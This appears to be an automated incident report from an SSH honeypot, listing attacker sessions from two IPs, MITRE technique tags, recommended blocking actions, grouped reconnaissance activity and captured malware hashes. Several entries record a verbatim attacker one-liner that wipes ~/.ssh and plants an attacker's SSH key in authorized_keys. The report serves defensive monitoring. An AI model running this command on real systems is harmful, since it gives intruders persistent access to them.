| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:38:09` | `cowrie.session.connect` |
| `2026-05-26 07:38:09` | `cowrie.client.version` |
| `2026-05-26 07:38:09` | `cowrie.client.kex` |
| `2026-05-26 07:38:10` | `cowrie.login.success` |
| `2026-05-26 07:38:10` | `cowrie.session.params` |
| `2026-05-26 07:38:10` | `cowrie.command.input` |
| `2026-05-26 07:38:10` | `cowrie.command.failed` |
| `2026-05-26 07:38:10` | `cowrie.log.closed` |
| `2026-05-26 07:38:11` | `cowrie.session.params` |
| `2026-05-26 07:38:11` | `cowrie.command.input` |
| `2026-05-26 07:38:11` | `cowrie.session.file_download` |
| `2026-05-26 07:38:11` | `cowrie.log.closed` |
| `2026-05-26 07:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e46a181f44c9

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:38 |
| **Last Seen** | 2026-05-26 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:38:14` | `cowrie.session.connect` |
| `2026-05-26 07:38:14` | `cowrie.client.version` |
| `2026-05-26 07:38:14` | `cowrie.client.kex` |
| `2026-05-26 07:38:15` | `cowrie.login.success` |
| `2026-05-26 07:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb9b943db665

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:38 |
| **Last Seen** | 2026-05-26 07:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:38:50` | `cowrie.session.connect` |
| `2026-05-26 07:38:50` | `cowrie.client.version` |
| `2026-05-26 07:38:50` | `cowrie.client.kex` |
| `2026-05-26 07:38:51` | `cowrie.login.success` |
| `2026-05-26 07:38:51` | `cowrie.session.params` |
| `2026-05-26 07:38:51` | `cowrie.command.input` |
| `2026-05-26 07:38:51` | `cowrie.command.failed` |
| `2026-05-26 07:38:51` | `cowrie.log.closed` |
| `2026-05-26 07:38:52` | `cowrie.session.params` |
| `2026-05-26 07:38:52` | `cowrie.command.input` |
| `2026-05-26 07:38:52` | `cowrie.session.file_download` |
| `2026-05-26 07:38:52` | `cowrie.log.closed` |
| `2026-05-26 07:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b1b92e51c1e

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:38 |
| **Last Seen** | 2026-05-26 07:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:38:54` | `cowrie.session.connect` |
| `2026-05-26 07:38:54` | `cowrie.client.version` |
| `2026-05-26 07:38:54` | `cowrie.client.kex` |
| `2026-05-26 07:38:55` | `cowrie.login.success` |
| `2026-05-26 07:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b5501c59cb0

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:38 |
| **Last Seen** | 2026-05-26 07:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:38:59` | `cowrie.session.connect` |
| `2026-05-26 07:38:59` | `cowrie.client.version` |
| `2026-05-26 07:38:59` | `cowrie.client.kex` |
| `2026-05-26 07:39:00` | `cowrie.login.success` |
| `2026-05-26 07:39:01` | `cowrie.session.params` |
| `2026-05-26 07:39:01` | `cowrie.command.input` |
| `2026-05-26 07:39:01` | `cowrie.command.failed` |
| `2026-05-26 07:39:01` | `cowrie.log.closed` |
| `2026-05-26 07:39:01` | `cowrie.session.params` |
| `2026-05-26 07:39:01` | `cowrie.command.input` |
| `2026-05-26 07:39:02` | `cowrie.session.file_download` |
| `2026-05-26 07:39:02` | `cowrie.log.closed` |
| `2026-05-26 07:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989fdd3c8d68

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:39 |
| **Last Seen** | 2026-05-26 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:39:04` | `cowrie.session.connect` |
| `2026-05-26 07:39:04` | `cowrie.client.version` |
| `2026-05-26 07:39:05` | `cowrie.client.kex` |
| `2026-05-26 07:39:05` | `cowrie.login.success` |
| `2026-05-26 07:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc9802e0934

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:39 |
| **Last Seen** | 2026-05-26 07:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:39:24` | `cowrie.session.connect` |
| `2026-05-26 07:39:24` | `cowrie.client.version` |
| `2026-05-26 07:39:24` | `cowrie.client.kex` |
| `2026-05-26 07:39:25` | `cowrie.login.success` |
| `2026-05-26 07:39:25` | `cowrie.session.params` |
| `2026-05-26 07:39:25` | `cowrie.command.input` |
| `2026-05-26 07:39:25` | `cowrie.command.failed` |
| `2026-05-26 07:39:26` | `cowrie.log.closed` |
| `2026-05-26 07:39:26` | `cowrie.session.params` |
| `2026-05-26 07:39:26` | `cowrie.command.input` |
| `2026-05-26 07:39:26` | `cowrie.session.file_download` |
| `2026-05-26 07:39:26` | `cowrie.log.closed` |
| `2026-05-26 07:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e1fa98f8d2

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:39 |
| **Last Seen** | 2026-05-26 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:39:29` | `cowrie.session.connect` |
| `2026-05-26 07:39:29` | `cowrie.client.version` |
| `2026-05-26 07:39:29` | `cowrie.client.kex` |
| `2026-05-26 07:39:30` | `cowrie.login.success` |
| `2026-05-26 07:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e27f405cb3e8

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:39 |
| **Last Seen** | 2026-05-26 07:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:39:48` | `cowrie.session.connect` |
| `2026-05-26 07:39:48` | `cowrie.client.version` |
| `2026-05-26 07:39:48` | `cowrie.client.kex` |
| `2026-05-26 07:39:49` | `cowrie.login.success` |
| `2026-05-26 07:39:50` | `cowrie.session.params` |
| `2026-05-26 07:39:50` | `cowrie.command.input` |
| `2026-05-26 07:39:50` | `cowrie.command.failed` |
| `2026-05-26 07:39:50` | `cowrie.log.closed` |
| `2026-05-26 07:39:50` | `cowrie.session.params` |
| `2026-05-26 07:39:50` | `cowrie.command.input` |
| `2026-05-26 07:39:51` | `cowrie.session.file_download` |
| `2026-05-26 07:39:51` | `cowrie.log.closed` |
| `2026-05-26 07:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f7c4d08e21

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:39 |
| **Last Seen** | 2026-05-26 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:39:53` | `cowrie.session.connect` |
| `2026-05-26 07:39:53` | `cowrie.client.version` |
| `2026-05-26 07:39:53` | `cowrie.client.kex` |
| `2026-05-26 07:39:54` | `cowrie.login.success` |
| `2026-05-26 07:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1122ab7d9bd

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:40 |
| **Last Seen** | 2026-05-26 07:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:40:19` | `cowrie.session.connect` |
| `2026-05-26 07:40:19` | `cowrie.client.version` |
| `2026-05-26 07:40:19` | `cowrie.client.kex` |
| `2026-05-26 07:40:20` | `cowrie.login.success` |
| `2026-05-26 07:40:20` | `cowrie.session.params` |
| `2026-05-26 07:40:20` | `cowrie.command.input` |
| `2026-05-26 07:40:20` | `cowrie.command.failed` |
| `2026-05-26 07:40:20` | `cowrie.log.closed` |
| `2026-05-26 07:40:20` | `cowrie.session.params` |
| `2026-05-26 07:40:20` | `cowrie.command.input` |
| `2026-05-26 07:40:21` | `cowrie.session.file_download` |
| `2026-05-26 07:40:21` | `cowrie.log.closed` |
| `2026-05-26 07:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019a5d66e52c

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:40 |
| **Last Seen** | 2026-05-26 07:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:40:23` | `cowrie.session.connect` |
| `2026-05-26 07:40:23` | `cowrie.client.version` |
| `2026-05-26 07:40:23` | `cowrie.client.kex` |
| `2026-05-26 07:40:23` | `cowrie.login.success` |
| `2026-05-26 07:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb4cda5772a6

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:42 |
| **Last Seen** | 2026-05-26 07:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:42:41` | `cowrie.session.connect` |
| `2026-05-26 07:42:41` | `cowrie.client.version` |
| `2026-05-26 07:42:41` | `cowrie.client.kex` |
| `2026-05-26 07:42:42` | `cowrie.login.success` |
| `2026-05-26 07:42:42` | `cowrie.session.params` |
| `2026-05-26 07:42:42` | `cowrie.command.input` |
| `2026-05-26 07:42:42` | `cowrie.command.failed` |
| `2026-05-26 07:42:43` | `cowrie.log.closed` |
| `2026-05-26 07:42:43` | `cowrie.session.params` |
| `2026-05-26 07:42:43` | `cowrie.command.input` |
| `2026-05-26 07:42:43` | `cowrie.session.file_download` |
| `2026-05-26 07:42:43` | `cowrie.log.closed` |
| `2026-05-26 07:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b2a3ebb82d

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:42 |
| **Last Seen** | 2026-05-26 07:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:42:45` | `cowrie.session.connect` |
| `2026-05-26 07:42:45` | `cowrie.client.version` |
| `2026-05-26 07:42:45` | `cowrie.client.kex` |
| `2026-05-26 07:42:46` | `cowrie.login.success` |
| `2026-05-26 07:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `119.160.215[.]50` | **45** | 2026-05-26 05:16 | 2026-05-26 06:24 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `132.148.29[.]10` | **25** | 2026-05-26 06:29 | 2026-05-26 07:52 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.23[.]159` | **20** | 2026-05-26 05:53 | 2026-05-26 06:27 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.32.240[.]31` | **20** | 2026-05-26 06:38 | 2026-05-26 06:59 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]145` | **20** | 2026-05-26 06:22 | 2026-05-26 07:03 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.119.21[.]245` | **20** | 2026-05-26 07:27 | 2026-05-26 07:46 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.141.171[.]139` | **20** | 2026-05-26 04:43 | 2026-05-26 04:53 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.250.89[.]44` | **20** | 2026-05-26 07:14 | 2026-05-26 07:24 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.248.8[.]33` | **20** | 2026-05-26 07:31 | 2026-05-26 07:40 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.91.186[.]36` | **15** | 2026-05-26 04:30 | 2026-05-26 04:54 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.96.220[.]35` | **14** | 2026-05-26 03:54 | 2026-05-26 04:09 | 2m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.168.35[.]207` | **6** | 2026-05-26 06:21 | 2026-05-26 06:31 | 12m | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | **3** | 2026-05-26 06:15 | 2026-05-26 07:21 | 3m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]99` | **2** | 2026-05-26 05:45 | 2026-05-26 05:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.171.8[.]87` | **2** | 2026-05-26 04:41 | 2026-05-26 04:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.69.1[.]51` | **2** | 2026-05-26 04:40 | 2026-05-26 04:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.47.155[.]9` | 1 | 2026-05-26 05:09 | 2026-05-26 05:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.83.83[.]235` | 1 | 2026-05-26 06:34 | 2026-05-26 06:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.145.102[.]69` | 1 | 2026-05-26 06:22 | 2026-05-26 06:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.196.30[.]45` | 1 | 2026-05-26 06:20 | 2026-05-26 06:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.106[.]205` | 1 | 2026-05-26 07:37 | 2026-05-26 07:37 | 6s | 0 | `T1592` | 🟢 LOW |
| `120.48.134[.]186` | 1 | 2026-05-26 07:27 | 2026-05-26 07:27 | 7s | 0 | `T1592` | 🟢 LOW |
| `120.48.147[.]81` | 1 | 2026-05-26 06:28 | 2026-05-26 06:28 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.76[.]234` | 1 | 2026-05-26 05:22 | 2026-05-26 05:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.115[.]202` | 1 | 2026-05-26 06:29 | 2026-05-26 06:30 | 5s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-05-26 04:43 | 2026-05-26 04:43 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.243[.]197` | 1 | 2026-05-26 05:17 | 2026-05-26 05:17 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.10.86[.]130` | 1 | 2026-05-26 05:49 | 2026-05-26 05:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.208.13[.]101` | 1 | 2026-05-26 04:27 | 2026-05-26 04:27 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
